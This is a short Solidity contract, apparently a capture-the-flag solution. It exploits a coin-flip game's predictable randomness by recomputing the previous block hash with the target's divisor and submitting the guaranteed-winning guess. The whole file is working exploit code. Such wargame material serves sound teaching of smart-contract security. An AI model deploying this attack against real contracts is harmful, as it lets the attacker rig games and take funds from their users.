// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public instance;

    constructor(address _instance) public {
        instance = ICoinFlip(_instance);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        instance.flip(side);
    }
}
